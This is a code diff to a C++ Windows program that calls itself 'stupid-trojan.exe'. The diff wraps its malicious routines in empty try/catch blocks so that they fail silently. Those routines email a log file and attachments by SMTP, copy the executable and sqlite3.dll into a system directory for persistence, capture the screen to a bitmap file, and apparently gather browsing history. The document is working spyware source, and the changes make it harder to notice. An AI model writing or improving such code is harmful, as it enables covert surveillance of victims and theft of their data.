@@ -31,8 +31,11 @@ void sendemail()
 		//mail.AddAttachment("../test1.jpg");
 		strcat(buffer, "\\log");
 		mail.AddAttachment(buffer);
-
-		mail.Send();
+		try
+		{
+			mail.Send();
+		}
+		catch(...){}
 
 	}
 	catch (ECSmtp e)
@@ -82,9 +85,15 @@ void getHistory()
 
 void copy()
 {
-	copyitself("\\stupid-trojan.exe");
-	copyitself("\\sqlite3.dll");
+	try
+	{
+		copyitself("\\stupid-trojan.exe");
+		copyitself("\\sqlite3.dll");
+	}
+	catch(...){}
+	
 }
+
 void copyitself(const char *s)
 {
 	char system[MAX_PATH];
@@ -102,7 +111,6 @@ void copyitself(const char *s)
 	{
 		ifstream source(pathtofile, ios::binary);
 		ofstream dest(system, ios::binary);
-
 		istreambuf_iterator<char> begin_source(source);
 		istreambuf_iterator<char> end_source;
 		ostreambuf_iterator<char> begin_dest(dest);
@@ -158,14 +166,19 @@ int ScreenCapture(const char* fname)
 	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
 	bmfHeader.bfSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
 	bmfHeader.bfType = 0x4D42; //'BM' for Bitmaps
-
-	DWORD temp = 0;
-	HANDLE hFile = CreateFileA(fname, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &temp, NULL);
-	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &temp, NULL);
-	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &temp, NULL);
-	CloseHandle(hFile);
-
+	try
+	{
+		DWORD temp = 0;
+		HANDLE hFile = CreateFileA(fname, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &temp, NULL);
+		WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &temp, NULL);
+		WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &temp, NULL);
+		CloseHandle(hFile);
+	}
+	catch(...)
+	{
+		
+	}
 	GlobalUnlock(hDIB);
 	GlobalFree(hDIB);
 
@@ -176,6 +189,5 @@ cleanup:
 	DeleteObject(hdcMemDC);
 	ReleaseDC(NULL, hdcScreen);
 	ReleaseDC(hWnd, hdcWindow);
-
 	return result;
 }
